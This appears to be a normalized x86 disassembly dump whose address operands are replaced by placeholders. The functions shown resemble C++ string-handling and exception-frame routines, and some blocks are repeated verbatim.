mov edx [ ebp - 0x104 ]
push edx
mov ecx [ ebp - 0x108 ]
push ecx
mov eax [ ebp - 0x10c ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x94 ]
mov [ ebp - 0x110 ] edx
mov [ ebp - 0x111 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add edx [ ebp - 0xbc ]
mov [ ebp - 0xc4 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebp - 0x1a4 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x1c1 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
mov ecx [ esi + 0x28 ]
cmp ecx [ ebp - 0x184 ]
jae r-xdata
lea edx [ esi + 0x8 ]
push edx
call sub_4bc8cc
pop ecx
lea eax [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x110 ]
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x118 ] ecx
mov edx [ ebp - 0x118 ]
mov cl [ ebp - 0x111 ]
mov [ edx ] cl
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xc8 ] eax
mov edx [ ebp - 0xc0 ]
push edx
mov ecx [ ebp - 0xc4 ]
push ecx
mov eax [ ebp - 0xc8 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0xbc ]
mov [ ebp - 0xcc ] edx
mov ecx [ ebp - 0xcc ]
mov [ ebp - 0xd0 ] ecx
mov [ ebp - 0xd1 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
inc [ ebp - 0x60 ]
inc [ ebp - 0x60 ]
mov eax rw-data
mov [ esi ] eax
inc [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0x15c ]
mov [ ebp - 0x1cc ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
jmp r-xdata
cmp [ ebp - 0x184 ] 0x0
jbe r-xdata
mov eax [ esi + 0x28 ]
mov [ ebp - 0x184 ] eax
lea edx [ esi + 0x18 ]
mov edx [ esi + 0x18 ]
jmp r-xdata
add eax [ ebp - 0x164 ]
add eax [ ebp - 0x160 ]
mov [ ebp - 0x16c ] eax
cmp [ esi + 0x2c ] 0x10
jb r-xdata
mov edx [ ebp - 0xd0 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xd8 ] eax
mov eax [ ebp - 0xd8 ]
mov cl [ ebp - 0xd1 ]
mov [ eax ] cl
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x1e9 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x1e4 ] edx
mov ecx [ ebp - 0x1e4 ]
mov [ ebp - 0x1e8 ] ecx
mov eax [ ebp - 0x1e8 ]
push eax
call sub_4b0180
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ esi + 0x28 ] edx
add eax edx
mov [ ebp - 0x1c8 ] eax
mov eax [ ebp - 0x1c8 ]
mov cl [ ebp - 0x1c1 ]
mov [ eax ] cl
mov edx [ esi + 0x28 ]
sub edx [ ebp - 0x184 ]
mov [ ebp - 0x188 ] edx
cmp [ esi + 0x2c ] 0x10
jb r-xdata
lea eax [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
jmp r-xdata
add edx [ ebp - 0x164 ]
mov [ ebp - 0x170 ] edx
mov eax [ ebp - 0x168 ]
push eax
mov ecx [ ebp - 0x16c ]
push ecx
mov eax [ ebp - 0x170 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ esi + 0x28 ]
sub edx [ ebp - 0x160 ]
mov [ ebp - 0x174 ] edx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x178 ] ecx
mov [ ebp - 0x179 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea eax [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
jmp r-xdata
mov [ ebp - 0x1d0 ] ecx
cmp [ esi + 0x2c ] 0x10
jb r-xdata
lea ecx [ esi + 0x18 ]
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov edx [ ebp - 0x178 ]
mov [ esi + 0x28 ] edx
add eax edx
mov [ ebp - 0x180 ] eax
mov eax [ ebp - 0x180 ]
mov cl [ ebp - 0x179 ]
mov [ eax ] cl
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x1f0 ] ecx
mov edx [ ebp - 0x1f0 ]
mov cl [ ebp - 0x1e9 ]
mov [ edx ] cl
mov [ ebp - 0x6c ] 0xc
push esi
push r-xdata
call sub_4d1c20
add esp 0x24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ esi + 0x18 ]
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov [ ebp - 0x1d4 ] eax
mov edx [ ebp - 0x1cc ]
push edx
mov ecx [ ebp - 0x1d0 ]
push ecx
mov eax [ ebp - 0x1d4 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x15c ]
mov [ ebp - 0x1d8 ] edx
mov [ ebp - 0x1d9 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
lea eax [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
jmp r-xdata
add ecx [ ebp - 0x184 ]
mov [ ebp - 0x18c ] ecx
cmp [ esi + 0x2c ] 0x10
jb r-xdata
mov eax [ ebp - 0x1d8 ]
mov [ esi + 0x28 ] eax
add ecx eax
mov [ ebp - 0x1e0 ] ecx
mov edx [ ebp - 0x1e0 ]
mov cl [ ebp - 0x1d9 ]
mov [ edx ] cl
lea eax [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
jmp r-xdata
mov [ ebp - 0x190 ] eax
mov edx [ ebp - 0x188 ]
push edx
mov ecx [ ebp - 0x18c ]
push ecx
mov eax [ ebp - 0x190 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ esi + 0x28 ]
sub edx [ ebp - 0x184 ]
mov [ ebp - 0x194 ] edx
mov ecx [ ebp - 0x194 ]
mov [ ebp - 0x198 ] ecx
mov [ ebp - 0x199 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
mov edx [ ebp - 0x198 ]
mov [ esi + 0x28 ] edx
add eax edx
mov [ ebp - 0x1a0 ] eax
mov eax [ ebp - 0x1a0 ]
mov cl [ ebp - 0x199 ]
mov [ eax ] cl
jmp r-xdata
sub_4bc8cc
push ebp
mov ebp esp
add esp 0xfffffe10
mov eax rw-data
push ebx
push esi
push edi
lea esi [ ebp - 0x30 ]
lea ebx [ ebp - 0x58 ]
call sub_4c517c
lea edx [ ebp - 0x7c ]
lea ecx [ ebp - 0x84 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
push 0x0
mov [ ebp - 0x6c ] 0x18
push ecx
call sub_408628
pop ecx
lea eax [ ebp - 0x84 ]
push eax
lea edx [ ebx + 0x8 ]
push edx
call sub_408650
add esp 0x8
mov ecx 0xf
mov [ ebx + 0x24 ] ecx
mov [ ebp - 0x85 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + 0x24 ] 0x10
mov edx rw-data
jb r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x8c ] eax
mov eax [ ebp - 0x8c ]
mov cl [ ebp - 0x85 ]
mov [ eax ] cl
push rw-data
call sub_4c4e7c
pop ecx
mov edi eax
mov eax rw-data
test eax eax
je r-xdata
test dl dl
je r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea edx [ ebx + 0x8 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x11c ] eax
cmp [ ebp - 0x11c ] 0x1
ja r-xdata
cmp [ ebx + 0x24 ] 0x10
mov eax rw-data
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp edx ecx
jb r-xdata
mov ecx [ ebp - 0x11c ]
dec ecx
mov ecx 0x1
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp edi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edi ecx
jbe r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x90 ]
mov [ ebp - 0x94 ] edx
cmp edi [ ebp - 0x94 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
sub eax ecx
mov [ ebp - 0x90 ] eax
mov eax [ ebx + 0x20 ]
cmp eax [ ebp - 0x90 ]
jae r-xdata
mov dl 0x1
add eax [ ebx + 0x20 ]
cmp eax rw-data
ja r-xdata
test edi edi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push edi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
cmp ebx ebx
jne r-xdata
mov [ ebp - 0x94 ] edi
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x135 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0x94 ]
mov [ ebp - 0xdc ] eax
lea edx [ ebx + 0x8 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0xe0 ] eax
cmp [ ebp - 0xe0 ] 0x1
ja r-xdata
mov [ ebp - 0x98 ] 0xffffffff
mov eax [ ebp - 0x90 ]
add eax [ ebp - 0x94 ]
mov [ ebp - 0x9c ] eax
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0x9c ]
jae r-xdata
mov eax ebx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0xe0 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov ecx [ ebx + 0x20 ]
sub ecx [ ebp - 0x9c ]
cmp ecx [ ebp - 0x98 ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
lea edx [ esi + 0x18 ]
mov edx [ esi + 0x18 ]
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x13c ] eax
mov eax [ ebp - 0x13c ]
mov cl [ ebp - 0x135 ]
mov [ eax ] cl
mov eax [ ebx + 0x24 ]
cmp eax [ ebp - 0xdc ]
jae r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0xdc ]
jae r-xdata
cmp [ ebp - 0x98 ] 0x0
jbe r-xdata
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0x9c ]
mov [ ebp - 0x98 ] eax
mov edx [ ebx + 0x20 ]
mov [ ebp - 0x15c ] edx
cmp [ ebp - 0x15c ] 0xffffffff
jbe r-xdata
lea eax [ esi + 0x8 ]
push eax
call sub_4bc8cc
pop ecx
xor eax eax
mov [ esi + 0x28 ] eax
add edx eax
mov [ ebp - 0x158 ] edx
mov edx [ ebp - 0x158 ]
mov cl [ ebp - 0x151 ]
mov [ edx ] cl
cmp [ ebx + 0x20 ] 0x0
jae r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x140 ] edx
push edi
push rw-data
mov eax [ ebp - 0x140 ]
push eax
call sub_4c4cb0
add esp 0xc
mov [ ebp - 0x141 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebp - 0xdc ] 0x0
jne r-xdata
mov edx [ ebx + 0x20 ]
push edx
mov eax [ ebp - 0xdc ]
push eax
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x90 ]
mov [ ebp - 0xbc ] eax
cmp [ ebx + 0x20 ] 0x0
jae r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x9c ]
sub edx [ ebp - 0x98 ]
mov [ ebp - 0xa0 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea ecx [ esi + 0x8 ]
cmp ecx ebx
jne r-xdata
mov [ ebp - 0x15c ] 0xffffffff
mov [ ebx + 0x20 ] edi
add ecx edi
mov [ ebp - 0x148 ] ecx
mov eax [ ebp - 0x148 ]
mov dl [ ebp - 0x141 ]
mov [ eax ] dl
cmp [ ebp - 0xdc ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xf9 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x20 ]
cmp edx [ ebp - 0xbc ]
jae r-xdata
push ebx
call sub_4bc8cc
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x15c ]
mov [ ebp - 0x1a4 ] eax
lea edx [ esi + 0x10 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x1a8 ] eax
cmp [ ebp - 0x1a8 ] 0x1
ja r-xdata
mov [ ebp - 0x160 ] 0xffffffff
mov eax [ ebp - 0x15c ]
mov [ ebp - 0x164 ] eax
mov edx [ esi + 0x28 ]
cmp edx [ ebp - 0x164 ]
jae r-xdata
mov eax ebx
jmp r-xdata
mov edx [ ebp - 0x94 ]
mov [ ebp - 0x104 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0xbc ] 0x0
jbe r-xdata
mov ecx [ ebx + 0x20 ]
mov [ ebp - 0xbc ] ecx
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x9c ]
add ecx [ ebp - 0x98 ]
mov [ ebp - 0xa4 ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x1a8 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov eax [ esi + 0x28 ]
sub eax [ ebp - 0x164 ]
cmp eax [ ebp - 0x160 ]
jae r-xdata
lea ecx [ esi + 0x8 ]
push ecx
call sub_4bc8cc
pop ecx
inc [ ebp - 0x60 ]
push esi
call sub_4088ac
pop ecx
inc [ ebp - 0x60 ]
mov edx rw-data
mov [ esi ] edx
lea ecx [ ebx + 0x8 ]
push ecx
lea eax [ ebp - 0x150 ]
push eax
call sub_408650
add esp 0x8
lea edx [ ebp - 0x150 ]
push edx
lea ecx [ esi + 0x10 ]
push ecx
call sub_408650
add esp 0x8
mov eax 0xf
mov [ esi + 0x2c ] eax
mov [ ebp - 0x151 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x100 ] eax
mov eax [ ebp - 0x100 ]
mov cl [ ebp - 0xf9 ]
mov [ eax ] cl
mov eax [ ebx + 0x20 ]
sub eax [ ebp - 0xbc ]
mov [ ebp - 0xc0 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add eax [ ebp - 0x9c ]
mov [ ebp - 0xa8 ] eax
mov edx [ ebp - 0xa0 ]
push edx
mov ecx [ ebp - 0xa4 ]
push ecx
mov eax [ ebp - 0xa8 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x98 ]
mov [ ebp - 0xac ] edx
mov ecx [ ebp - 0xac ]
mov [ ebp - 0xb0 ] ecx
mov [ ebp - 0xb1 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ esi + 0x2c ]
cmp edx [ ebp - 0x1a4 ]
jae r-xdata
lea eax [ esi + 0x8 ]
push eax
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x1a4 ]
jae r-xdata
cmp [ ebp - 0x160 ] 0x0
jbe r-xdata
mov edx [ esi + 0x28 ]
sub edx [ ebp - 0x164 ]
mov [ ebp - 0x160 ] edx
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x90 ]
mov [ ebp - 0x108 ] ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0xb0 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xb8 ] eax
mov eax [ ebp - 0xb8 ]
mov cl [ ebp - 0xb1 ]
mov [ eax ] cl
cmp [ ebp - 0x1a4 ] 0x0
jne r-xdata
mov eax [ esi + 0x28 ]
push eax
mov edx [ ebp - 0x1a4 ]
push edx
lea ecx [ esi + 0x8 ]
push ecx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x184 ] eax
cmp [ esi + 0x28 ] 0x0
jae r-xdata
mov ecx [ esi + 0x28 ]
sub ecx [ ebp - 0x164 ]
sub ecx [ ebp - 0x160 ]
mov [ ebp - 0x168 ] ecx
cmp [ esi + 0x2c ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x10c ] eax
mov edx [ ebp - 0x104 ]
push edx
mov ecx [ ebp - 0x108 ]
push ecx
mov eax [ ebp - 0x10c ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x94 ]
mov [ ebp - 0x110 ] edx
mov [ ebp - 0x111 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
add edx [ ebp - 0xbc ]
mov [ ebp - 0xc4 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebp - 0x1a4 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x1c1 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
mov ecx [ esi + 0x28 ]
cmp ecx [ ebp - 0x184 ]
jae r-xdata
lea edx [ esi + 0x8 ]
push edx
call sub_4bc8cc
pop ecx
lea eax [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x110 ]
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x118 ] ecx
mov edx [ ebp - 0x118 ]
mov cl [ ebp - 0x111 ]
mov [ edx ] cl
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xc8 ] eax
mov edx [ ebp - 0xc0 ]
push edx
mov ecx [ ebp - 0xc4 ]
push ecx
mov eax [ ebp - 0xc8 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0xbc ]
mov [ ebp - 0xcc ] edx
mov ecx [ ebp - 0xcc ]
mov [ ebp - 0xd0 ] ecx
mov [ ebp - 0xd1 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
inc [ ebp - 0x60 ]
inc [ ebp - 0x60 ]
mov eax rw-data
mov [ esi ] eax
inc [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0x15c ]
mov [ ebp - 0x1cc ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
jmp r-xdata
cmp [ ebp - 0x184 ] 0x0
jbe r-xdata
mov eax [ esi + 0x28 ]
mov [ ebp - 0x184 ] eax
lea edx [ esi + 0x18 ]
mov edx [ esi + 0x18 ]
jmp r-xdata
add eax [ ebp - 0x164 ]
add eax [ ebp - 0x160 ]
mov [ ebp - 0x16c ] eax
cmp [ esi + 0x2c ] 0x10
jb r-xdata
mov edx [ ebp - 0xd0 ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xd8 ] eax
mov eax [ ebp - 0xd8 ]
mov cl [ ebp - 0xd1 ]
mov [ eax ] cl
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x1e9 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x1e4 ] edx
mov ecx [ ebp - 0x1e4 ]
mov [ ebp - 0x1e8 ] ecx
mov eax [ ebp - 0x1e8 ]
push eax
call sub_4b0180
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ esi + 0x28 ] edx
add eax edx
mov [ ebp - 0x1c8 ] eax
mov eax [ ebp - 0x1c8 ]
mov cl [ ebp - 0x1c1 ]
mov [ eax ] cl
mov edx [ esi + 0x28 ]
sub edx [ ebp - 0x184 ]
mov [ ebp - 0x188 ] edx
cmp [ esi + 0x2c ] 0x10
jb r-xdata
lea eax [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
jmp r-xdata
add edx [ ebp - 0x164 ]
mov [ ebp - 0x170 ] edx
mov eax [ ebp - 0x168 ]
push eax
mov ecx [ ebp - 0x16c ]
push ecx
mov eax [ ebp - 0x170 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ esi + 0x28 ]
sub edx [ ebp - 0x160 ]
mov [ ebp - 0x174 ] edx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x178 ] ecx
mov [ ebp - 0x179 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea eax [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
jmp r-xdata
mov [ ebp - 0x1d0 ] ecx
cmp [ esi + 0x2c ] 0x10
jb r-xdata
lea ecx [ esi + 0x18 ]
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov edx [ ebp - 0x178 ]
mov [ esi + 0x28 ] edx
add eax edx
mov [ ebp - 0x180 ] eax
mov eax [ ebp - 0x180 ]
mov cl [ ebp - 0x179 ]
mov [ eax ] cl
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x1f0 ] ecx
mov edx [ ebp - 0x1f0 ]
mov cl [ ebp - 0x1e9 ]
mov [ edx ] cl
mov [ ebp - 0x6c ] 0xc
push esi
push r-xdata
call sub_4d1c20
add esp 0x24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ esi + 0x18 ]
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov [ ebp - 0x1d4 ] eax
mov edx [ ebp - 0x1cc ]
push edx
mov ecx [ ebp - 0x1d0 ]
push ecx
mov eax [ ebp - 0x1d4 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x15c ]
mov [ ebp - 0x1d8 ] edx
mov [ ebp - 0x1d9 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
lea eax [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
jmp r-xdata
add ecx [ ebp - 0x184 ]
mov [ ebp - 0x18c ] ecx
cmp [ esi + 0x2c ] 0x10
jb r-xdata
mov eax [ ebp - 0x1d8 ]
mov [ esi + 0x28 ] eax
add ecx eax
mov [ ebp - 0x1e0 ] ecx
mov edx [ ebp - 0x1e0 ]
mov cl [ ebp - 0x1d9 ]
mov [ edx ] cl
lea eax [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
jmp r-xdata
mov [ ebp - 0x190 ] eax
mov edx [ ebp - 0x188 ]
push edx
mov ecx [ ebp - 0x18c ]
push ecx
mov eax [ ebp - 0x190 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ esi + 0x28 ]
sub edx [ ebp - 0x184 ]
mov [ ebp - 0x194 ] edx
mov ecx [ ebp - 0x194 ]
mov [ ebp - 0x198 ] ecx
mov [ ebp - 0x199 ] 0x0
cmp [ esi + 0x2c ] 0x10
jb r-xdata
mov edx [ ebp - 0x198 ]
mov [ esi + 0x28 ] edx
add eax edx
mov [ ebp - 0x1a0 ] eax
mov eax [ ebp - 0x1a0 ]
mov cl [ ebp - 0x199 ]
mov [ eax ] cl
jmp r-xdata
sub_4bd4f0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
lea ebx [ ebp - 0x24 ]
mov esi rw-data
mov edi rw-data
mov eax rw-data
call sub_4c517c
mov [ ebx + 0x10 ] 0xc
mov edx rw-data
mov ecx rw-data
mov [ rw-data ] edx
mov eax rw-data
inc [ ebx + 0x1c ]
mov [ rw-data ] ecx
inc [ ebx + 0x1c ]
mov [ rw-data ] eax
inc [ ebx + 0x1c ]
mov edx rw-data
mov [ rw-data ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov [ rw-data ] ecx
inc [ ebx + 0x1c ]
mov eax rw-data
mov [ rw-data ] eax
lea edx [ esi + 0x10 ]
inc [ ebx + 0x1c ]
mov [ esi ] edx
mov ecx rw-data
mov eax rw-data
mov [ esi + 0x18 ] ecx
mov edx rw-data
inc [ ebx + 0x1c ]
mov [ esi + 0x18 ] eax
inc [ ebx + 0x1c ]
mov [ esi + 0x4 ] edx
mov eax [ esi ]
mov ecx rw-data
mov [ eax + 0x8 ] ecx
push eax
call sub_4b30b8
pop ecx
lea edx [ edi + 0x8 ]
inc [ ebx + 0x1c ]
mov [ edi ] edx
mov ecx rw-data
mov eax rw-data
mov [ edi + 0x10 ] ecx
mov edx rw-data
inc [ ebx + 0x1c ]
mov [ edi + 0x10 ] eax
inc [ ebx + 0x1c ]
mov [ edi + 0x4 ] edx
mov eax [ edi ]
mov ecx rw-data
mov [ eax + 0x8 ] ecx
push eax
call sub_4b30b8
pop ecx
mov edx rw-data
inc [ ebx + 0x1c ]
mov [ rw-data ] rw-data
mov [ rw-data ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov [ rw-data ] ecx
inc [ ebx + 0x1c ]
mov eax rw-data
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
mov [ eax + 0x8 ] edx
push eax
call sub_4b30b8
pop ecx
mov edx rw-data
inc [ ebx + 0x1c ]
mov [ rw-data ] rw-data
mov [ rw-data ] edx
mov ecx rw-data
inc [ ebx + 0x1c ]
mov [ rw-data ] ecx
inc [ ebx + 0x1c ]
mov eax rw-data
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
mov [ eax + 0x8 ] edx
push eax
call sub_4b30b8
pop ecx
inc [ ebx + 0x1c ]
mov edx [ ebx ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4bd674
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
mov edi rw-data
lea esi [ ebp - 0x24 ]
call sub_4c517c
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
push 0x0
push rw-data
call sub_4b3018
add esp 0x8
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
push 0x0
push rw-data
call sub_4b3018
add esp 0x8
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
push 0x0
push rw-data
call sub_4b3018
add esp 0x8
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
dec [ esi + 0x1c ]
push 0x0
push rw-data
call sub_4b3018
dec [ esi + 0x1c ]
mov edx rw-data
mov [ edi ] edx
add esp 0x8
cmp [ edi + 0x4c ] 0x0
je r-xdata
dec [ esi + 0x1c ]
mov eax rw-data
mov [ edi ] eax
push 0x3
mov edx [ edi + 0x3c ]
push edx
call sub_4b2f24
dec [ esi + 0x1c ]
mov ecx rw-data
mov [ rw-data ] ecx
add esp 0x8
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x50 ] 0x0
mov ebx edi
jne r-xdata
dec [ esi + 0x1c ]
mov edx rw-data
mov [ rw-data ] edx
push 0x3
mov ecx [ rw-data ]
push ecx
call sub_4b2f24
dec [ esi + 0x1c ]
mov eax rw-data
mov [ rw-data ] eax
add esp 0x8
cmp [ rw-data ] 0x0
je r-xdata
mov ebx rw-data
cmp [ rw-data ] 0x0
jne r-xdata
push edi
call sub_4c0888
pop ecx
test al al
jne r-xdata
xor ecx ecx
mov ebx ecx
jmp r-xdata
dec [ esi + 0x1c ]
mov ecx rw-data
mov [ rw-data ] ecx
push 0x3
mov eax [ rw-data ]
push eax
call sub_4b2f24
add esp 0x8
mov edx [ esi ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx rw-data
cmp [ rw-data ] 0x0
jne r-xdata
push rw-data
call sub_4c0888
pop ecx
test al al
jne r-xdata
xor eax eax
mov ebx eax
jmp r-xdata
mov edx [ edi + 0x50 ]
push edx
call sub_4c6870
pop ecx
test eax eax
je r-xdata
